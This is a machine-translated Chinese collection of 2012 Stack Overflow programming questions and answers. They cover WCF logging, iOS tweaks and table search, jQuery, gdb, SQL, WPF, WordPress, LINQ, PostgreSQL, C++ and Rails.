> 赞同：1
> 
> 时间：2012-11-16T20:37:40.320

这是 webHttpBinding + 4.5 在启用消息日志时的一个已知问题。并且与[http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/2bc5e5a6-1971-46cb-8b4f-f1c46130faca](http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/2bc5e5a6-1971-46cb-8b4f-f1c46130faca)相同。在服务中启用消息日志记录时会发生此问题。在修复此问题之前，请通过在您的配置中注释掉这些行来禁用您的应用配置文件中的消息日志记录。我验证了您的应用程序在禁用消息日志记录时工作正常。希望这可以帮助！

```
<!--
<messageLogging logEntireMessage="true" logMalformedMessages="true" logMessagesAtServiceLevel="false" logMessagesAtTransportLevel="true"
maxMessagesToLog="300000" maxSizeOfMessageToLog="200000" />--> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T13:30:15.817

我们也面临同样的问题。设置或删除设置有帮助`logMessagesAtTransportLevel`。`false`

# iphone - 当我尝试在 IOS 6 上连接 SBSearchModel 和 SBSearchController 时出错

> ID：13418628
> 
> 赞同：0
> 
> 时间：2012-11-16T14:31:43.650
> 
> 标签：iphone, ios, nsstring, ios6

嗨，我有一个 cydia 调整的问题，即在 iOS 6 上挂钩 SBSearchModel 和 SBSearchController 但是在我写在聚光灯字段后它崩溃了这里是代码

```
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#define LOCAL_SEARCH NSLocalizedStringFromTable(@"SEARCH_BAR_PLACEHOLDER", @"SpringBoard", @"")
#define SEARCH_STRING [NSString stringWithFormat:LOCAL_SEARCH, @"Cydia"]

@interface SBSearchModel : NSObject
+ (id)sharedInstance;
- (BOOL)sectionIsWebSearch:(NSInteger)section;
@end

@interface SBSearchTableViewCell : UITableViewCell
@property (retain, nonatomic) NSString *title;
@end

NSInteger cydiaCellIndex = -1;

%hook SBSearchController

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    if ([[%c(SBSearchModel) sharedInstance] sectionIsWebSearch:section])
    {
        cydiaCellIndex = %orig;
        return cydiaCellIndex + 1;
    }

    return %orig;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath

{
    if ([[%c(SBSearchModel) sharedInstance] sectionIsWebSearch:indexPath.section] && indexPath.row == cydiaCellIndex)
    {
        SBSearchTableViewCell *cell = (SBSearchTableViewCell *)%orig(tableView, [NSIndexPath indexPathForRow:cydiaCellIndex - 1 inSection:indexPath.section]);
        cell.title = SEARCH_STRING;
        return (UITableViewCell *)cell;
    }
    return %orig;

}

%end

%hook SBSearchModel

- (NSURL *)launchingURLForWebSearchRow:(NSInteger)row queryString:(NSString *)queryString

{
    if (row == cydiaCellIndex)
{
        return [NSURL URLWithString:[NSString stringWithFormat:@"cydia://search/%@", [queryString stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]]];
}

    return %orig;
}

%end 
```

我用 NSString 尝试了所有东西，但是当我在里面放任何东西时它仍然崩溃？NSString 有什么问题？！任何想法

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-30T16:45:39.280

看看 iostream 的 SearchLoader：[https ://github.com/theiostream/SearchLoader](https://github.com/theiostream/SearchLoader)

# json - 在 TableView 上执行搜索后应用程序崩溃

> ID：13418630
> 
> 赞同：0
> 
> 时间：2012-11-16T14:31:44.673
> 
> 标签：json, uitableview, crash, uisearchbar

我目前正在尝试按照本教程来实现搜索。 [http://www.appcoda.com/how-to-add-search-bar-uitableview/](http://www.appcoda.com/how-to-add-search-bar-uitableview/) 但是，我的应用程序崩溃了，但我不知道如何修复它。

我的应用程序中的 JSON 目前只有一行的数据（我无法更改它，因为我没有数据库访问权限）。

我最初的看法看起来不错。TableView 已填充（有 1 行）。当我点击搜索栏并输入一些不在该项目名称中的字符时，我会看到正常的“未找到结果”屏幕。当我输入项目名称中存在的任何字符时，它会按预期显示过滤的项目。但是，当我输入第二个字母（即项目名称）时，我的应用程序崩溃，并在控制台中给出以下输出。

```
Terminating app due to uncaught exception 'NSRangeException', reason: '-[__NSCFArray objectAtIndex:]: index (1) beyond bounds (1)' 
```

现在到我的代码。numberOfRowsInSection 方法根据搜索进行修改。

```
 - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    // Return the number of rows in the section.
    if (tableView == self.searchDisplayController.searchResultsTableView) {
        return [searchResults count];

    } else {
        return [[resultSearch valueForKeyPath:@"data.auctions"]count];
        }
} 
```

numberOfSectionsInTableView 只有一个部分硬编码（返回 1；因为我目前不需要更多）

现在我的 cellForRowAtIndexPath：

```
 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
    {

        static NSString *simpleTableIdentifier = @"SimpleTableItem";
        SimpleTableCell *cell = (SimpleTableCell *)[tableView dequeueReusableCellWithIdentifier:simpleTableIdentifier]; //custom cell

        if (cell == nil)
        {
            NSArray *nib = [[NSBundle mainBundle] loadNibNamed:@"SimpleTableCell" owner:self options:nil];
            cell = [nib objectAtIndex:0];

        }

        NSDictionary *aucdict = [jsonAukResultsSearch objectAtIndex:indexPath.row]; //assigning current row from NSMutableArray(jsonAukResultsSearch) to Dictionary, this is probably crash spot
        NSURL *imageURL = [NSURL URLWithString:[aucdict objectForKey:@"img_url"]];
        NSData *result = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];
//sending request to get picture
        UIImage *imageLoad = [[UIImage alloc] initWithData:result];
        NSString *timeString = [aucdict objectForKey:@"time_left"];
        NSString *priceString = [aucdict objectForKey:@"current_value"];

        // Configure the cell...
        if (tableView == self.searchDisplayController.searchResultsTableView) {
            cell.textLabel.text = [searchResults objectAtIndex:indexPath.row];
        } else {
            cell.nameLabel.text = [aucdict objectForKey:@"name"];
        }

        //cell.thumbnailImageView.image = imageLoad;
        //commented while crashes are happening

        return cell;
    } 
```

现在，在我的应用程序崩溃后，我的线路与

```
NSDictionary *aucdict = [jsonAukResultsSearch objectAtIndex:indexPath.row]; 
```

是荧光笔，所以我猜，这可能是 indexPath 参数超出范围的地方。我真的不明白 index(1) 怎么会越界(1)。我知道，我只有零个或一个返回行（取决于搜索短语）。

我今天才开始搜索，所以我不知道那些棘手的地方是什么..任何建议都值得赞赏:)谢谢你，Yanchi

编辑：好的，所以我发现我的问题可能出在哪里......我密切关注这个问题顶部提到的教程。这个方法应该返回带有搜索结果的数组。

```
- (void)filterContentForSearchText:(NSString*)searchText scope:(NSString*)scope
{

    NSPredicate *resultPredicate = [NSPredicate
                                    predicateWithFormat:@"SELF contains[cd] %@",
                                    searchText];

    searchResults = [poleMien filteredArrayUsingPredicate:resultPredicate];
    NSLog(@"%u",[searchResults count]);
} 
```

如您所见，我添加了 NSLog... 现在，当我添加匹配的第一个字母时，控制台输出为 1（应该是），因此我的过滤结果将毫无问题地显示。但是，当我输入另一个匹配的字母时，我的 searchResults 数组将增加到 2（好像它会计算“匹配”字母），这可能是我崩溃的原因（尝试访问索引 1，而我只有一个的数据我的 searchResults 数组中的项目）

之后我更改了我的 NSLog 以显示数组的内容......在插入匹配的字母后，相同的项目被添加到我的数组中（所以我的数组中有另一个项目，它与我的数组中的第一项具有相同的数据）

编辑 2：好的，所以我的问题是，每当我将 json 数据从字典保存到数组（以便我可以使用数组来过滤结果）时，我都会在 cellForRowAtIndexPath 中执行此操作。所以我的数组每次都加载相同的值，搜索表被“重新填充”。现在我需要找到一些方法来将数据加载到数组中，前提是它是不同的项目。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T13:54:02.777

好的，我终于发现出了什么问题。我正在将 json 响应的名称字段保存到数组中。我的数组正在 cellForRowAtIndexPath 中更新，因此在搜索框中输入两个与我的结果匹配的字母后，该结果被保存到数组中两次（所以我的数组中有 2 个相同的项目）因此我崩溃了，因为索引超出了界限.

我通过检查我的数组是否包含相同的值并将唯一值保存到另一个这样的数组来修复它。

```
newarray = [[NSMutableArray alloc] init];
    NSString *laststring = nil;
    for (NSString *currentstring in poleMien)
    {
        if (![currentstring isEqualToString:laststring]) [newarray addObject:currentstring];
        laststring = currentstring;
    } 
```

谢谢browsoffire，你告诉我正确的方式:)

# jquery - 在js对话框中重定向一个url（视图）

> ID：13418631
> 
> 赞同：0
> 
> 时间：2012-11-16T14:31:47.437
> 
> 标签：jquery, asp.net-mvc, json, wcf

我有一个 MVC 3 应用程序。我想显示我刚刚创建的结果。

控制器和视图的一些代码。

```
 public ActionResult ViewGenerated(string Number, string ClientID)
    {
        // get a list of inmate id's and pins from batch number
        string url = HttpContext.Request.Url.ToString();
        int client;
        client = int.Parse(ClientID);
        int batch = int.Parse(Number);

        var list = (from a in aContext.aDetail
                    select a).ToList();
        // set this to the object collection
        ViewBag.x = list;
        return View();
    } 
```

然后查看

```
@foreach (var r in ViewBag.x)
    { 
        <tr>
            <td>@r.ID</td>
            <td>@r.Name</td>
        </tr> 
```

在我的 javascript 代码中，我调用 WCF 并返回数字，然后尝试将其传递给控制器​​？

```
function GenerateX() {
    // blah blah
    $.getJSON('/some service', function (response) {
    });
    // What I want is to get the number from the service then redirect the url to the view 
    $(this).dialog('close'); // Close it
} 
```

我使用了一个 jquery 对话框来调用“GenerateX”。

我不知道该怎么做，我在这方面并不强。

非常感谢。

**更新：**

```
 $.getJSON('/Services/InService.svc/blah/GeneratePINs/').success(viewPins);
    // return "Number" here and want to pass it to controller.
    $(this).dialog('close'); // Close it
}

function viewPins(data) {
    var clientId = $("#clientIds").val();
    alert(clientId); // code not reach here
    window.open('/WebAdminOrion/blah/ViewGeneratedPINs?Number=' + data + '?&ClientID=' + clientId);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T20:36:48.217

我找到了答案。

```
window.open('/WebAdminOrion/blah/ViewGeneratedPINs?Number=' + data + '&ClientID=' + clientId); 
```

有一个问号。删除它然后重新爱它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T15:41:54.677

看到这个：

HTML（用于 javascript 无障碍）：

```
<!-- Constant or key in the "web.config" having the service route -->
<input type="hidden" id="service-url" value="@ConstUrlService" />
<input type="hidden" id="action-url" value="@Url.Action("action", "controller")" /> 
```

有关获取服务 URL 的最佳实现，请参阅[对 WCF REST 服务的 jQuery AJAX 调用](http://www.west-wind.com/weblog/posts/2008/Apr/21/jQuery-AJAX-calls-to-a-WCF-REST-Service)

JS（外部文件）：

```
function GenerateX() {

    var dialog = this; 

    // blah blah
    $.getJSON($('#service-url').val(), function (response) {

       /*
       the call to "close" must be here, because the "ajax" is asynchronous 
       */

       /*
       This answer has to be the number, and could have a response status 
       for example Ok (true/false) 
       */

       if (response.Ok && response.Number != 0) {

            $(dialog).dialog('close'); // Close it
            window.location = $('#action-url').val() + '?Number=' + response.Number + '&ClientID=' + response.ClientID; 
       }
       else {

            alert('problem');
       }

    }).fail(function() {

       /* 
       for error
       */ 

       alert('call error');

    });
}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:51:10.610

你可以使用`window.location.href`

前任。

```
window.location.href = '/controllername/actionname'; 
```

或者

```
window.location.href = '@Url.Action("actionname")'; 
```

# jquery - jQuery焦点回调

> ID：13418633
> 
> 赞同：2
> 
> 时间：2012-11-16T14:31:48.777
> 
> 标签：jquery

有人可以告诉我为什么这不起作用吗？

```
$("textarea.settings").focus(function () {
            var size = $(this).height();
            console.log(size);
            if(size == 40) {$(this).animate({height: 120},"slow");} 
        }, function () {
            $(this).animate({height: 40},"slow");
        }); 
```

请告诉我为什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-16T14:34:08.107

`focus()`不接受 2 个参数。`blur()`如果您的意图是开/关焦点，请使用：

```
$("textarea.settings").focus(function () {
    var size = $(this).height();
    console.log(size);
    if(size == 40) {$(this).animate({height: 120},"slow");} 
}).blur(function () {
    $(this).animate({height: 40},"slow");
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:38:55.823

## *[jsBin 演示](http://jsbin.com/iquhoq/4/edit)*

```
$("textarea.settings").on('focus blur',function (e) {
    var isFocus = e.type=='focus',
        animH = isFocus? 120 : 40;
    $(this).animate({height: animH}, 800);
}); 
```

您可以在里面列出您的事件，`.on([events list])` 而不是设置一个布尔变量 ( `isFocus`)，您可以分别使用 a`ternary operator`和 animate 来调整您的大小。

# c - 调用 setbuf(stdout, NULL)：当前上下文中没有符号“NULL”

> ID：13418634
> 
> 赞同：8
> 
> 时间：2012-11-16T14:31:50.590
> 
> 标签：c, null, gdb

如果我想`NULL`在`gdb`'s call 语句中使用标识符，我该怎么办？

是因为我没有在 gdb 中包含 stdio.h 吗？

我试过了：`call #include <stdio.h>`但这似乎不起作用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-16T16:00:04.117

`NULL`是一个 C 定义，在某处定义为：

```
#define NULL ((void *) 0) 
```

`NULL`被 C 预处理器替换为`((void *) 0)`. 所以它永远不会传递给编译器，所以你不能在`gdb`.

所以按照*Jester*的建议去做，然后使用`(void *) 0`.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-16T15:23:48.610

只需使用`0`or `(void*)0`。没有什么花哨。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-07-28T15:16:24.473

目前的 GCC 和 GDB 可以看到定义，但是必须用 编译`-ggdb3`，`-g`是不够的。

输入程序：

```
#include <stdio.h>
#define ABC 123

int main() {
    return 0;
} 
```

广发银行：

```
# start is required.
start
print ABC
print NULL 
```

输出：

```
$1 = 123
$2 = (void *) 0x0 
```

在 Ubuntu 14.04 上使用 GCC 4.8 和 GDB 7.7.1 进行测试。

另请参阅：[如何在 GDB 中打印 #defined 常量？](https://stackoverflow.com/questions/2934006/how-do-i-print-a-defined-constant-in-gdb)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-12-08T06:12:54.903

上面很好，0x0 也应该用于比较指针，0x0 是 NULL 指向的内存地址。这是我在运行 gdb（在 MS-DOS 终端上）时使用的一个示例，用于打印内存地址并查看哪些指向 NULL 以调试分段错误： [![NULL 指针比较的控制台 gdb 打印输出](../Images/b4647d77a9672c571f2613f420032763.png)](https://i.stack.imgur.com/UeYeU.png)

# mysql - 通过计数和分组正确获取此 sql 查询

> ID：13418638
> 
> 赞同：0
> 
> 时间：2012-11-16T14:32:09.430
> 
> 标签：mysql, sql

我在尝试正确获取此查询时遇到了麻烦。

假设我有一张包含以下数据的表格：

```
id    |   xyz     |   code
===========================
1     |    1      |    ba
2     |    1      |    zz
3     |    1      |    ba
1     |    1      |    zz
1     |    1      |    ba
2     |    1      |    zz 
```

我想得到一个“xyz”的总和，按id分组，例如

```
SELECT id, SUM(xyz) as mysum FROM table WHERE xyz=1 GROUP BY id 
```

我最终会得到结果：

```
id   |  mysum 
================
1    |  3
2    |  2
3    |  1 
```

完美的。

问题是，我实际上想做的也是按“代码”列分组，这样如果说 id: 1，它有 2 个条目，代码为“ba”，那么结果会更像这：

```
id   |  mysum 
================
1    |  2
2    |  1
3    |  1 
```

这是我对mysql的有限理解让我失望的地方。因为我会考虑做这样的查询：

```
SELECT id, SUM(xyz) AS mysum FROM table WHERE xyz=1 GROUP BY id, code 
```

但这显然给出了我*不*想要的结果。

我怎样才能做这种对列 xyz 求和的查询，而如果它已经添加了一个具有相同“代码”的查询，则忽略它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:48:22.770

```
SELECT id,
       SUM(CASE WHEN code = 'ba' then 1 ELSE 0 END)
FROM table1
GROUP BY id 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/ccf58/2)

*后续问题：为什么 id=2 的值为 1，不是 0 吗？*

**更新 1**

```
SELECT id,
       count(Distinct code)
FROM table1
GROUP BY id 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/ccf58/4)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:39:20.997

```
SELECT code,SUM(xyz) FROM table GROUP BY code,xyz 
```

# c# - 从 ObservableCollection 获取字符串属性 目的

> ID：13418640
> 
> 赞同：0
> 
> 时间：2012-11-16T14:32:18.060
> 
> 标签：c#, mvvm, observablecollection

在我的 C# 应用程序中，我正在调用一个返回数组的方法：

```
projectArray = client.getProjectList(username, password); 
```

因为我想使用 MVVM 模式将应用程序重构为 WPF，所以我应该使用`ObservableCollection`项目列表。

我的视图模型包含：

```
// Members
CProject[] projectArray;
ObservableCollection<CProject> projectList;

// Properties
public ObservableCollection<CProject> ProjectList {
  get { return projectList; }
  set {
    projectList = value;
    OnPropertyChanged("ProjectList");
  }
} 
```

以及设置属性的代码：

```
projectArray = client.getProjectList(username, password);
projectList = new ObservableCollection<CProject>(projectArray);
this.ProjectList = projectList; 
```

问题来了。我的视图包含一个绑定到视图模型`ProjectList`属性的组合框。绑定工作正常。但是，组合框显示的值如`MyApp.SoapApi.CProject`. 我想显示可通过`CProject.database.name`.

这样做的适当和正确方法是什么？我尝试使用`projectList = value.database.name`，但这是一个与属性类型冲突的字符串`CProject`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:37:42.140

您的组合框包含一个名为 DisplayMemeberPath 的属性，将其设置为“database.name”。使用视图进行输出格式化，而不是视图模型！

或为组合框中的项目创建模板

```
<ComboBox ItemsSource="{Binding ...}">
<ComboBox.ItemsTemplate>
<DataTemplate>
<Label Content="{Binding database.name}"/>
</DataTemplate>
</ComboBox.ItemsTemplate>
</ComboBox> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:39:42.483

您应该将组合框的 DisplayMemberPath 设置为要在组合框文本中显示的属性的路径：

```
<ComboBox DisplayMemberPath="database.name" /> 
```

此外，您的代码可以简化为：

```
// Members
ObservableCollection<CProject> projectList;

// Properties
public ObservableCollection<CProject> ProjectList {
    get { return projectList; }
    set {
        projectList = value;
        OnPropertyChanged("ProjectList");
    }
}

this.ProjectList = new ObservableCollection<CProject>(client.getProjectList(username, password)); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-16T14:52:42.507

*首先将视图的数据上下文设置为 ViewModel。*

*看法 ：*

```
public YourWindowView()
        {

            this.DataContext = new YourWindowViewModel();
        } 
```

*然后在ViewModel ViewModel中填写Project列表*
*：*

```
public class YourWindowViewModel : INotifyPropertyChanged
            {
                    ObservableCollection<CProject> projectList;

        // Properties
        public ObservableCollection<CProject> ProjectList {
          get { return projectList; }
          set {
            projectList = value;
            OnPropertyChanged("ProjectList");
          }
        }

        public  YourWindowViewModel ()
            {
                // fill project list here
                 this.ProjectList = new ObservableCollection<CProject>(client.getProjectList(username, password));
             }
        } 
```

*绑定到视图*

XAML

```
 <ComboBox ItemsSource="{Binding Path=ProjectList}"                
              IsSynchronizedWithCurrentItem="True"
              DisplayMemberPath="database.name" /> 
```

# ios - iOS 上可访问的时间标签

> ID：13418641
> 
> 赞同：18
> 
> 时间：2012-11-16T14:32:18.923
> 
> 标签：ios, accessibility, voiceover

我正在尝试使我的 iPhone 应用程序可访问。其中一部分涉及为`NSDate`. 如何`NSDate`以一种可访问的方式格式化一个在 VoiceOver 支持的所有语言中都能正常工作的格式？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-05-04T02:19:03.077

NSDateFormatter 有一个`localizedStringFromDate:dateStyle:timeStyle:`自动处理本地化的方法。为每个日期和时间部分传递一个日期和 NSDateFormatterStyles。请注意，如果您想要用画外音很好读的东西，您可能需要不同的日期和时间样式。在大多数情况下，NSDateFormatterLongStyle 适用于日期（因为您完全拼写了月份），而 NSDateFormatterShortStyle 适用于时间（因为它不包括秒）。

更多信息： [https ://developer.apple.com/documentation/foundation/dateformatter/1415241-localizedstring](https://developer.apple.com/documentation/foundation/dateformatter/1415241-localizedstring)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-03-21T08:04:17.447

日期和数字**的格式**必须正确，以便 VoiceOver 用户可以完全理解。

使用以下元素并查看一些[代码片段](http://a11y-guidelines.orange.com/mobile_EN/dev-ios.html#date-time-and-numbers) *（Objc + Swift）*，以了解如何实现无可挑剔的读取。 [![在此处输入图像描述](../Images/940b9c2d6272263fb986cce62366a768.png)](https://i.stack.imgur.com/vy8rs.png)

# php - 如何将wordpress循环的内容作为循环外的一个变量回显

> ID：13418644
> 
> 赞同：1
> 
> 时间：2012-11-16T14:32:21.200
> 
> 标签：php, wordpress, loops

我在 wordpress 的 php 模板文件中使用简码，因为简码打开和关闭我需要将其中的全部内容作为一个变量获取。在这种情况下，内容是一个 wordpress 循环。

到目前为止，我只显示了循环的最后一篇文章。我明白为什么，因为这就是变量的最终值。我想知道有人可以帮助我将全部内容（即所有三个帖子）放入一个变量中，而不是最后一个帖子。

谢谢

```
<?php 
                $news_title .= '';
                $news_single_post .= '';

            if ( have_posts() ) :
            $the_query = new WP_Query( array ( 'posts_per_page' => 3, 'cat' => 1 ) ); /*  */
             while ($the_query->have_posts() ) : $the_query->the_post(); ?>
            <?php 
                $news_title = get_the_title();
                $news_excerpt = get_the_excerpt();
                $news_single_post = '<div class="home-content-news-title">'.$news_title.'</div><div class="home-content-news-excerpt">'.$news_excerpt.'</div>';

                endwhile;
                wp_reset_postdata();

                endif; 

                $news_tab_title_string = 'News';
                $news_tab_title_shortcode = do_shortcode('[wptabtitle]'.$news_tab_title_string.'[/wptabtitle]');
                $news_tab_content_shortcode = do_shortcode('[wptabcontent]'.$news_single_post.'[/wptabcontent]');
                $news_tab = $news_tab_title_shortcode.$news_tab_content_shortcode;
                echo do_shortcode('[wptabs]'.$news_tab.'[/wptabs]');

         ?> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T14:34:37.443

定义您希望所有内容进入循环上方和外部的变量，例如`$variable = '';`，然后在循环内连接到该变量`$variable .= $content_to_concat;`，然后`echo $variable;`在最后使用循环外打印全部内容。

以您的代码为例：

```
<?php 
    $news_title .= '';
    $news_single_post .= '';
    $news_all_posts = ''; // Define the variable

    if ( have_posts() ) :
    $the_query = new WP_Query( array ( 'posts_per_page' => 3, 'cat' => 1 ) ); /*  */

    while ($the_query->have_posts() ) : $the_query->the_post();

    $news_title = get_the_title();
    $news_excerpt = get_the_excerpt();
    $news_single_post = '<div class="home-content-news-title">'.$news_title.'</div><div class="home-content-news-excerpt">'.$news_excerpt.'</div>';

    $news_all_posts .= $news_single_post; // Add each post to the variable

    endwhile;
    wp_reset_postdata();

    endif;

    $news_tab_title_string = 'News';
    $news_tab_title_shortcode = do_shortcode('[wptabtitle]'.$news_tab_title_string.'[/wptabtitle]');

    // Use the variable to display the content
    $news_tab_content_shortcode = do_shortcode('[wptabcontent]'.$news_all_posts.'[/wptabcontent]');

    $news_tab = $news_tab_title_shortcode.$news_tab_content_shortcode;
    echo do_shortcode('[wptabs]'.$news_tab.'[/wptabs]');
 ?> 
```

# c# - Linq 导致 Top (1) 出现语法错误

> ID：13418647
> 
> 赞同：3
> 
> 时间：2012-11-16T14:32:37.843
> 
> 标签：c#, .net, sql, sql-server, linq

我有一个使用 linq 的 EF 上下文，该上下文在多个不同类型的 sql 服务器上执行。我发现 linq 在 sql server 2000 机器上导致语法错误，因为 linq 翻译`.FirstOrDefault()`被翻译成使用`SELECT TOP (1)`而不是的sql，`SELECT TOP 1`并且括号似乎导致此语法错误，因为它们不受支持sql server 2000 中的这个上下文。

是否可以强制 linq 使用`SELECT TOP 1`而不是`SELECT TOP (1)`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:35:22.107

您可以**`ToList().Take(1)`**在订购后使用方法。

# php - 使用 posgres 和 php 从数据库中的一个表中获取不在另一个数据库中的另一个表中的所有 id

> ID：13418649
> 
> 赞同：-2
> 
> 时间：2012-11-16T14:32:45.237
> 
> 标签：php, postgresql

我使用的是 PostgreSQL 8.1，并且我有两个数据库，其中一个表名客户端相同，每个客户端都包含 +-50k 行。

我需要在一个表中获取不在另一个表中的所有 id，我有以下解决方案

```
$sql = "SELECT id FROM clients WHERE id NOT IN(".pg_query($conn1,'SELECT id FROM clients').")";
$result = pg_query($conn2,$sql); 
```

在我运行它之前，这是通过 PHP 实现它的好方法还是其他更好更快的方法？

不幸的是，我无法使用 dblink，因为我没有安装它的权限。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:49:10.253

### 数据库链接

您可以使用[**dblink**](http://www.postgresql.org/docs/current/interactive/contrib-dblink-function.html)在查询中引用来自另一个数据库的表。

然后您的查询可能如下所示（多种不同方法之一）：

```
SELECT id
FROM   clients c
LEFT   JOIN (
    SELECT *
    FROM   dblink('dbname=mydb', 'SELECT id FROM clients')
    AS     c(id int)
    )  x USING (id)
WHERE  x.id IS NULL; 
```

自 PostgreSQL 9.1 以来[，安装附加模块](http://www.postgresql.org/docs/current/interactive/sql-createextension.html)变得更加简单：

```
CREATE EXTENSION dblink; 
```

每个数据库运行一次。至于[必要的特权](http://www.postgresql.org/docs/current/interactive/sql-createextension.html)：

> 加载扩展需要创建其组件对象所需的相同权限。对于大多数扩展，这意味着需要超级用户或数据库所有者权限。

### 复制

如果 dblink（或类似的 x-db 工具对您不可用，请尝试使用[`COPY`](http://www.postgresql.org/docs/current/interactive/sql-copy.html)TO / FROM 传输外部表的内容：

在国外数据库中：

```
COPY clients TO '/path/to/file'; 
```

在家庭数据库中：

```
CREATE TEMP TABLE c_tmp (LIKE clients);
COPY c_tmp FROM '/path/to/file';

SELECT id
FROM   clients c
LEFT   JOIN c_tmp x USING (id)
WHERE  x.id IS NULL; 
```

温度。表在会话结束时自动删除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T15:12:57.757

如果您不能使用数据库链接，我认为您将不得不在中间件中进行操作——并且该中间件应该有很多 RAM。

我也建议不要为此目的使用 PHP，但如果你没有其他可能性，我会这样做：

```
$ids = array();
$idsNotExist = array();
$resultDb1 = pg_query('SELECT id FROM db1');
while ( $row = pg_fetch_dontknowtheexactfunction_row($resultDb1) ) {
  array_push($ids, $row['id']);
}

$resultDb2 = pg_query('SELECT id FROM db2');
while ( $row = pg_fetch($resultDb2) ) {
  if ( !in_array($ids, $row['id']) ) {
    array_push($idsNotExist, $row['id']);
  }
} 
```

最好的方法当然是，因为 ID 是主键，所以编写一个自己的 in_array 函数，该函数在找到 ID 时从 haystack 中删除它，因为它不会被再次搜索，并且下一个搜索循环会更快一些。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:43:38.103

```
SELECT id
FROM db.clients
WHERE id NOT IN (
   SELECT id
   FROM otherdb.clients
) 
```

一个查询。不需要多个数据库连接，除非您用于第一个连接的用户 ID 对其中一个表没有访问权限。SQL 允许完全绝对`db.table.field`类型规范以允许跨数据库查询。

# c++ - C++ 和初始化 const 变量

> ID：13418650
> 
> 赞同：0
> 
> 时间：2012-11-16T14:32:46.237
> 
> 标签：c++

我想使用名称为“a”的 const int 变量创建类 Test。之后，我需要创建构造函数，其中变量“a”的值 = 10。我创建类 test 并在 test.h 中创建`const int a;`类 Test.h 和 test.cpp 我有类似的东西：

```
#include "stdafx.h"
#include "Test.h"

Test::Test(void)
{
    a = 10;
    b = 20;
    size = 20;
    tekst[size];
    }

Test::~Test(void)
{
} 
```

这是test.h：

```
#pragma once
class Test
{

    const int a;  

public:
    Test(void);
    ~Test(void);
    int b;
    char *tekst;
    int size;
    static double d;
    int y;
}; 
```

但我得到错误：

```
Error   1   error C2758: 'Test::a' : must be initialized in constructor base/member initializer list    c:\users\bożydar\documents\visual studio 2012\projects\consoleapplication1\consoleapplication1\test.cpp 6
Error   2   error C2166: l-value specifies const object c:\users\bożydar\documents\visual studio 2012\projects\consoleapplication1\consoleapplication1\test.cpp 7 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-16T14:34:04.090

错误说明了一切，`a must be initialized in constructor base/member initializer list`

```
Test::Test(void) : a(10) // Initializer list
{
...
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-16T14:34:11.007

错误告诉你该怎么做

```
Test::Test(void) : a(10) // an initializer list
{
    b = 20;
    size = 20;
    tekst[size];
} 
```

顺便说一句，我想你会发现代码

```
tekst[size]; 
```

不符合您的预期。大概你的意思

```
tekst = new char[size]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-16T14:35:14.437

您必须在初始化列表中执行此操作：

```
Test::Test(void) : a(10) {
  ...
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-16T14:35:31.397

`a`是 const，所以你不能分配给它。但是，您必须对其进行初始化。

做：

```
Test::Test(void)
:a(10)
{
    ...
} 
```

顺便说一句，`tekst[size]`可能不会像你想的那样做。它什么也不做！

# ruby-on-rails - 如何确保一组属性的唯一性

> ID：13418651
> 
> 赞同：0
> 
> 时间：2012-11-16T14:32:45.333
> 
> 标签：ruby-on-rails, ruby-on-rails-3.2

我正在使用 Rails 3.2.8，我想确保表的 1 行中的一组属性的唯一性，但我可以有多个具有相同值的行。validates_uniqueness_of 验证器似乎不适用于此。为了给出一些上下文，这些是彩票号码选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T17:02:27.267

为确保`winning_number_X`!= `winning_number_Y`，请尝试：

```
# in your model

UNIQ_FIELDS = [:winning_number_1, :winning_number_2, :winning_number_3,
  :winning_number_4, :winning_number_5, :winning_number_6, :winning_number_bonus]

validate :numbers_uniquness

# ...    

def numbers_uniquness 
  unless UNIQ_FIELDS.map{|field| self[field] }.uniq.length == UNIQ_FIELDS.length
    errors[:base] << "Numbers have to be uniq" 
  end
end 
```

# java - SpringMVC REST Web 服务

> ID：13418652
> 
> 赞同：0
> 
> 时间：2012-11-16T14:32:46.517
> 
